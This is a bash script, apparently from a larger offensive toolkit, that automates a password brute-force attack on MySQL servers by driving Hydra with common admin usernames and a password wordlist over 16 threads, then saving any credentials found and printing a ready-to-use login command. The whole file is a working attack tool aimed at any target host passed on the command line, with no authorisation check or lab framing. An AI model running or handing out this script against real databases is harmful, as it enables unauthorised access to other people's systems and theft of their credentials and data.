#!/bin/bash

# MySQL Admin Attack Script
# Automated MySQL database brute-force

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger
source "$SCRIPT_DIR/logger.sh"

# Default configuration
THREADS=16
TIMEOUT=30
TARGET=""
PORT=3306

# Common MySQL admin usernames
DEFAULT_USERNAMES=(root admin mysql dbadmin)

# Function to display help
show_help() {
    print_banner "MySQL Admin Attack Script"
    echo ""
    echo "Usage: $0 -t TARGET [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -t, --target      Target IP address or hostname"
    echo ""
    echo "Optional:"
    echo "  -p, --port        MySQL port (default: 3306)"
    echo "  -u, --user-list   Custom username list file"
    echo "  -w, --word-list   Custom password wordlist file"
    echo "  -T, --threads     Number of parallel threads (default: 16)"
    echo "  -o, --timeout     Connection timeout in seconds (default: 30)"
    echo "  -v, --verbose     Verbose output"
    echo "  -h, --help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100"
    echo "  $0 -t mysql.example.com -p 3307"
    echo ""
}

# Function to validate input
validate_input() {
    if [ -z "$TARGET" ]; then
        log_error "Target is required"
        show_help
        exit 1
    fi
    
    if ! command -v hydra &> /dev/null; then
        log_error "Hydra is not installed. Please run install.sh first"
        exit 1
    fi
}

# Function to run MySQL attack
run_attack() {
    local username_file=$(mktemp)
    
    # Get usernames
    if [ -n "$CUSTOM_USERLIST" ] && [ -f "$CUSTOM_USERLIST" ]; then
        cat "$CUSTOM_USERLIST" > "$username_file"
    else
        printf "%s\n" "${DEFAULT_USERNAMES[@]}" > "$username_file"
    fi
    
    # Get password wordlist
    local wordlist=""
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        wordlist="$CUSTOM_WORDLIST"
    elif [ -f "$PROJECT_ROOT/config/admin_passwords.txt" ]; then
        wordlist="$PROJECT_ROOT/config/admin_passwords.txt"
    else
        log_error "No password wordlist found"
        rm -f "$username_file"
        exit 1
    fi
    
    print_header "Starting MySQL Attack"
    log_info "Target: $TARGET:$PORT"
    log_info "Threads: $THREADS"
    log_info "Timeout: ${TIMEOUT}s"
    echo ""
    
    # Run hydra
    hydra -L "$username_file" -P "$wordlist" \
          -t $THREADS \
          -w $TIMEOUT \
          -f \
          mysql://$TARGET:$PORT 2>&1 | while IFS= read -r line; do
        
        if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
            local login=$(echo "$line" | grep -oP 'login: \K[^ ]+')
            local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
            
            save_result "mysql" "$TARGET" "$login" "$password" "$PORT"
            log_success "Valid credentials found: $login:$password"
            
            # Show connection string
            log_info "Connection string: mysql -h $TARGET -P $PORT -u $login -p$password"
            
            rm -f "$username_file"
            return 0
        fi
        
        [ "$VERBOSE" = "true" ] && echo "$line"
    done
    
    local result=$?
    rm -f "$username_file"
    
    if [ $result -ne 0 ]; then
        log_warning "No valid credentials found"
    fi
    
    return $result
}

# Parse command line arguments
CUSTOM_WORDLIST=""
CUSTOM_USERLIST=""
VERBOSE=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -u|--user-list)
            CUSTOM_USERLIST="$2"
            shift 2
            ;;
        -w|--word-list)
            CUSTOM_WORDLIST="$2"
            shift 2
            ;;
        -T|--threads)
            THREADS="$2"
            shift 2
            ;;
        -o|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
print_banner "MySQL Admin Attack"
echo ""

validate_input
run_attack
exit_code=$?

rotate_logs
exit $exit_code
